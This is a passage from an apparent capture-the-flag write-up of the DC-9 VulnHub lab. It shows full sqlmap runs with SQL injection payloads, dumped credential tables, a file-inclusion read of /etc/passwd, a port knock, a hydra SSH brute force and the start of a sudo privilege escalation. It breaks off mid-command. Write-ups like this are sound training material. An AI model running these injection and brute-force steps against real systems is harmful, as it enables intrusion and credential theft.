info!</p><p><img src="/2023/04/27/file-upload/image-20231114104840433.png" alt="image-20231114104840433"></p><p>SQLMAP GO!</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs inform7">┌──(root㉿kali)-<span class="hljs-comment">[~/Desktop/vulnhub/DC-9]</span><br>└─# sqlmap -r DC9 --random-agent --dbms=mysql -D Staff -T Users -C Username,Password --dump      <br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___<span class="hljs-comment">[&quot;]</span>_____ ___ ___  &#123;1.7.8#stable&#125;                                                                                                                                                                          <br>|_ -| . <span class="hljs-comment">[&#x27;]</span>     | .&#x27;| . |                                                                                                                                                                                         <br>|___|_  <span class="hljs-comment">[.]</span>_|_|_|__,|  _|                                                                                                                                                                                         <br>      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 21:58:47 /2023-11-13/<br><br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;DC9&#x27;<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-gb) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;                                                                                                                                                                              <br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> checking if the target <span class="hljs-keyword">is</span> protected by some <span class="hljs-keyword">kind</span> <span class="hljs-keyword">of</span> WAF/IPS<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> POST parameter &#x27;search&#x27; does not appear to be dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing for SQL injection on POST parameter &#x27;search&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic inline queries&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait............... (done)                                                                                                  <br><span class="hljs-comment">[21:59:08]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable <br>for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? <span class="hljs-comment">[Y/n]</span> y<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> automatically extending ranges for UNION query injection technique tests as there <span class="hljs-keyword">is</span> at least one other (potential) technique found<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> target URL appears to be UNION injectable with 6 columns<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable<br>POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> vulnerable. Do you want to keep testing the others (if any)? <span class="hljs-comment">[y/N]</span> y<br>sqlmap identified the following injection point(s) with a total <span class="hljs-keyword">of</span> 59 HTTP(s) requests:<br>---<br>Parameter: search (POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE<br><br>    Type: UNION query<br>    Title: Generic UNION query (NULL) - 6 columns<br>    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -<br>---<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web server operating system: Linux Debian 10 (buster)<br>web application technology: Apache 2.4.38<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> fetching entries <span class="hljs-keyword">of</span> column(s) &#x27;Password,Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> recognized possible password hashes in column &#x27;Password&#x27;<br>do you want to store hashes to a temporary file for eventual further processing with other tools <span class="hljs-comment">[y/N]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> writing hashes to a temporary file &#x27;/tmp/sqlmapnlg9g_9g406618/sqlmaphashes-__m2zybn.txt&#x27; <br>do you want to crack them via a dictionary-based attack? <span class="hljs-comment">[Y/n/q]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> using hash method &#x27;md5_generic_passwd&#x27;<br>what dictionary do you want to use?<br><span class="hljs-comment">[1]</span> default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)<br><span class="hljs-comment">[2]</span> custom dictionary file<br><span class="hljs-comment">[3]</span> file with list <span class="hljs-keyword">of</span> dictionary files<br>&gt; y<br><span class="hljs-comment">[21:59:22]</span> <span class="hljs-comment">[INFO]</span> using default dictionary<br>do you want to use common password suffixes? (slow!) <span class="hljs-comment">[y/N]</span> <br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting dictionary-based cracking (md5_generic_passwd)<br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting 4 processes <br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[WARNING]</span> no clear password(s) found                                                                                                                                                                  <br>Database: Staff<br><span class="hljs-section">Table: Users</span><br><span class="hljs-comment">[1 entry]</span><br>+----------+----------------------------------+<br>| Username | Password                         |<br>+----------+----------------------------------+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+----------+----------------------------------+<br><br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/Staff/Users.csv&#x27;<br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 21:59:39 /2023-11-13/<br></code></pre></td></tr></table></figure><p>856f5de590ef37314e7c3bdf6f8a66dc — md5 decrypt: transorbital1</p><p>Login using admin account:</p><p><img src="/2023/04/27/file-upload/image-20231114110420113.png" alt="image-20231114110420113"></p><p>“FILE DOES NOT EXIST” — It indicates that welcome.php page may have a param. </p><p>Maybe file? Let’s check it.</p><p><img src="/2023/04/27/file-upload/image-20231114111547238.png" alt="image-20231114111547238"></p><p>We can successfully access &#x2F;etc&#x2F;passwd through file param.</p><p>Do you remember that port 22 is filtered? It is possible that knock tool is utilized for port hidden.</p><p>Try to access knockd.conf file with vul mentioned above:</p><p><img src="/2023/04/27/file-upload/image-20231114112125136.png" alt="image-20231114112125136"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># knock 192.168.122.20 7469:tcp 8475:tcp 9842:tcp</span><br>                                                                                                                                                                                                                  <br>┌──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># nmap -p 22 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( https:<span class="hljs-regexp">//</span>nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">13</span> <span class="hljs-number">22</span>:<span class="hljs-number">24</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">122.20</span><br>Host is up (<span class="hljs-number">0.0041</span>s latency).<br><br>PORT   STATE SERVICE<br><span class="hljs-number">22</span>/tcp open  ssh<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">0.82</span> seconds<br></code></pre></td></tr></table></figure><p>Well, it worked.</p><p>Now we can access SSH service, however there’s nothing useful about valid accounts XD.</p><p>Let’s move back to sqlmap and check User database.</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kali)-[/usr/share/wordlists/wfuzz]<br>└─<span class="hljs-comment"># sqlmap -r /root/Desktop/vulnhub/DC-9/DC9 --random-agent --dbms=mysql -D users -T UserDetails -C username,password --dump</span><br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___[)]_____ ___ ___  &#123;1.7.8<span class="hljs-comment">#stable&#125;                                                                                                                                                                          </span><br>|<span class="hljs-string">_ -</span>|<span class="hljs-string"> . [&quot;]     </span>|<span class="hljs-string"> .&#x27;</span>|<span class="hljs-string"> . </span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string"></span>|<span class="hljs-string">___</span>|<span class="hljs-string">_  [&quot;]_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">_</span>|<span class="hljs-string">__,</span>|<span class="hljs-string">  _</span>|<span class="hljs-string">                                                                                                                                                                                         </span><br><span class="hljs-string">      </span>|<span class="hljs-string">_</span>|<span class="hljs-string">V...       </span>|<span class="hljs-string">_</span>|<span class="hljs-string">   https://sqlmap.org                                                                                                                                                                      </span><br><span class="hljs-string"></span><br><span class="hljs-string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="hljs-string"></span><br><span class="hljs-string">[*] starting @ 22:27:02 /2023-11-13/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[22:27:02] [INFO] parsing HTTP request from &#x27;/root/Desktop/vulnhub/DC-9/DC9&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] fetched random HTTP User-Agent header value &#x27;Opera/9.61 (X11; Linux i686; U; ru) Presto/2.1.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;</span><br><span class="hljs-string">[22:27:02] [INFO] testing connection to the target URL</span><br><span class="hljs-string">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="hljs-string">---</span><br><span class="hljs-string">Parameter: search (POST)</span><br><span class="hljs-string">    Type: time-based blind</span><br><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="hljs-string">    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Type: UNION query</span><br><span class="hljs-string">    Title: Generic UNION query (NULL) - 6 columns</span><br><span class="hljs-string">    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -</span><br><span class="hljs-string">---</span><br><span class="hljs-string">[22:27:02] [INFO] testing MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] confirming MySQL</span><br><span class="hljs-string">[22:27:02] [INFO] the back-end DBMS is MySQL</span><br><span class="hljs-string">web server operating system: Linux Debian 10 (buster)</span><br><span class="hljs-string">web application technology: Apache 2.4.38</span><br><span class="hljs-string">back-end DBMS: MySQL &gt;= 5.0.0 (MariaDB fork)</span><br><span class="hljs-string">[22:27:02] [INFO] fetching entries of column(s) &#x27;password,username&#x27; for table &#x27;UserDetails&#x27; in database &#x27;users&#x27;</span><br><span class="hljs-string">Database: users</span><br><span class="hljs-string">Table: UserDetails</span><br><span class="hljs-string">[17 entries]</span><br><span class="hljs-string">+-----------+---------------+</span><br><span class="hljs-string"></span>|<span class="hljs-string"> username  </span>|<span class="hljs-string"> password      </span>|<br>+-----------+---------------+<br>|<span class="hljs-string"> marym     </span>|<span class="hljs-string"> 3kfs86sfd     </span>|<br>|<span class="hljs-string"> julied    </span>|<span class="hljs-string"> 468sfdfsd2    </span>|<br>|<span class="hljs-string"> fredf     </span>|<span class="hljs-string"> 4sfd87sfd1    </span>|<br>|<span class="hljs-string"> barneyr   </span>|<span class="hljs-string"> RocksOff      </span>|<br>|<span class="hljs-string"> tomc      </span>|<span class="hljs-string"> TC&amp;TheBoyz    </span>|<br>|<span class="hljs-string"> jerrym    </span>|<span class="hljs-string"> B8m#48sd      </span>|<br>|<span class="hljs-string"> wilmaf    </span>|<span class="hljs-string"> Pebbles       </span>|<br>|<span class="hljs-string"> bettyr    </span>|<span class="hljs-string"> BamBam01      </span>|<br>|<span class="hljs-string"> chandlerb </span>|<span class="hljs-string"> UrAG0D!       </span>|<br>|<span class="hljs-string"> joeyt     </span>|<span class="hljs-string"> Passw0rd      </span>|<br>|<span class="hljs-string"> rachelg   </span>|<span class="hljs-string"> yN72#dsd      </span>|<br>|<span class="hljs-string"> rossg     </span>|<span class="hljs-string"> ILoveRachel   </span>|<br>|<span class="hljs-string"> monicag   </span>|<span class="hljs-string"> 3248dsds7s    </span>|<br>|<span class="hljs-string"> phoebeb   </span>|<span class="hljs-string"> smellycats    </span>|<br>|<span class="hljs-string"> scoots    </span>|<span class="hljs-string"> YR3BVxxxw87   </span>|<br>|<span class="hljs-string"> janitor   </span>|<span class="hljs-string"> Ilovepeepee   </span>|<br>|<span class="hljs-string"> janitor2  </span>|<span class="hljs-string"> Hawaii-Five-0 </span>|<br>+-----------+---------------+<br><br>[22:27:02] [INFO] table &#x27;users.UserDetails&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/users/UserDetails.csv&#x27;<br>[22:27:02] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br>[<span class="hljs-symbol">*</span>] ending @ 22:27:02 /2023-11-13/<br></code></pre></td></tr></table></figure><p>I utilized cut command to organize the data from the database into “user” and “pass” files for subsequent brute-force attacks.</p><p><img src="/2023/04/27/file-upload/image-20231114114012641.png" alt="image-20231114114012641"></p><p>hydra:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">┌──(root㉿kali)-[~/Desktop/vulnhub/DC<span class="hljs-number">-9</span>]<br>└─# hydra -L user -P pass <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span> ssh <br>Hydra v9<span class="hljs-number">.5</span> (c) <span class="hljs-number">2023</span> by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> use <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> non-binding, these *** ignore laws <span class="hljs-keyword">and</span> ethics anyway).<br><br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) starting at 2023-11-13 22:41:38</span><br><span class="hljs-string">[WARNING]</span> Many SSH configurations limit the number of parallel tasks, it <span class="hljs-keyword">is</span> recommended to reduce the tasks: use -t <span class="hljs-number">4</span><br><span class="hljs-string">[WARNING]</span> Restorefile (ignored ...) <span class="hljs-keyword">from</span> a previous session found, to prevent overwriting, ./hydra.restore<br><span class="hljs-string">[DATA]</span> max <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> server, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">391</span> login tries (l:<span class="hljs-number">17</span>/p:<span class="hljs-number">23</span>), ~<span class="hljs-number">25</span> tries per task<br><span class="hljs-string">[DATA]</span> attacking ssh:<span class="hljs-comment">//192.168.122.20:22/</span><br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: chandlerb   password: UrAG0D!<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: joeyt   password: Passw0rd<br><span class="hljs-string">[STATUS]</span> <span class="hljs-number">357.00</span> tries/min, <span class="hljs-number">357</span> tries <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">35</span> to <span class="hljs-keyword">do</span> <span class="hljs-keyword">in</span> <span class="hljs-number">00</span>:<span class="hljs-number">01</span>h, <span class="hljs-number">15</span> active<br><span class="hljs-string">[22]</span>[ssh] host: <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span>   login: janitor   password: Ilovepeepee<br><span class="hljs-number">1</span> of <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">3</span> valid passwords found<br><span class="hljs-string">[WARNING]</span> Writing restore file because <span class="hljs-number">1</span> <span class="hljs-keyword">final</span> worker threads did <span class="hljs-keyword">not</span> complete until end.<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">1</span> target did <span class="hljs-keyword">not</span> resolve <span class="hljs-keyword">or</span> could <span class="hljs-keyword">not</span> be connected<br><span class="hljs-string">[ERROR]</span> <span class="hljs-number">0</span> target did <span class="hljs-keyword">not</span> complete<br>Hydra (https:<span class="hljs-comment">//github.com/vanhauser-thc/thc-hydra) finished at 2023-11-13 22:42:46</span><br></code></pre></td></tr></table></figure><ul><li>chandlerb&#x2F;UrAG0D!</li><li>joeyt&#x2F;Passw0rd</li><li>janitor&#x2F;Ilovepeepee</li></ul><p>I logged in all three accounts and finally found something interesting with user janitor:</p><p><img src="/2023/04/27/file-upload/image-20231114115006218.png" alt="image-20231114115006218"></p><p>check this directory:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls<br>passwords-found-on-post-it-notes.txt<br>janitor<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:~/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>cat passwords-found-on-post-it-notes.txt <br><span class="hljs-title class_">BamBam01</span><br><span class="hljs-title class_">Passw0rd</span><br>smellycats<br><span class="hljs-title class_">P0Lic</span><span class="hljs-comment">#10-4</span><br><span class="hljs-title class_">B4</span>-<span class="hljs-title class_">Tru3</span><span class="hljs-number">-001</span><br><span class="hljs-number">4</span>uGU5T-<span class="hljs-title class_">NiGHts</span><br></code></pre></td></tr></table></figure><p>some new passwords! Add to our pass list and try hydra again:</p><p><img src="/2023/04/27/file-upload/image-20231114115744136.png" alt="image-20231114115744136"></p><p>We got a new user fredf.</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>ls -al /home/fredf/<br>total <span class="hljs-number">12</span><br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .<br>drwxr-xr-x <span class="hljs-number">19</span> root  root  <span class="hljs-number">4096</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> ..<br>lrwxrwxrwx  <span class="hljs-number">1</span> fredf fredf    <span class="hljs-number">9</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">29</span>  <span class="hljs-number">2019</span> .bash_history -&gt; /dev/null<br>drwx------  <span class="hljs-number">3</span> fredf fredf <span class="hljs-number">4096</span> <span class="hljs-title class_">Nov</span> <span class="hljs-number">14</span> <span class="hljs-number">13</span><span class="hljs-symbol">:</span><span class="hljs-number">41</span> .gnupg<br>fredf<span class="hljs-variable">@dc</span><span class="hljs-number">-9</span><span class="hljs-symbol">:/home/janitor/</span>.secrets-<span class="hljs-keyword">for</span>-putin<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> fredf on dc<span class="hljs-number">-9</span>:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span><br><br><span class="hljs-title class_">User</span> fredf may run the following commands on dc<span class="hljs-number">-9</span>:<br>    (root) <span class="hljs-symbol">NOPASSWD:</span> /opt/devstuff/dist/test/test<br></code></pre></td></tr></table></figure><p>It’s evident that we can execute &#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;test&#x2F;test in root privilege.</p><p>Let’s dig deeper.</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim">fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ /<span class="hljs-keyword">opt</span>/devstuff/dist/test/test<br>Usage: <span class="hljs-keyword">python</span> test.<span class="hljs-keyword">py</span> <span class="hljs-keyword">read</span> <span class="hljs-keyword">append</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">find</span> / -name test.<span class="hljs-keyword">py</span> -<span class="hljs-built_in">type</span> <span class="hljs-keyword">f</span> <span class="hljs-number">2</span>&gt;/dev/null <br>/<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>/usr/lib/<span class="hljs-keyword">python3</span>/dist-packages/setuptools/<span class="hljs-keyword">command</span>/test.<span class="hljs-keyword">py</span><br>fredf@dc-<span class="hljs-number">9</span>:/home/janitor/.secrets-<span class="hljs-keyword">for</span>-putin$ <span class="hljs-keyword">cat</span> /<span class="hljs-keyword">opt</span>/devstuff/test.<span class="hljs-keyword">py</span><br>#!/usr/bin/<span class="hljs-keyword">python</span><br><br>import sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (sys.<span 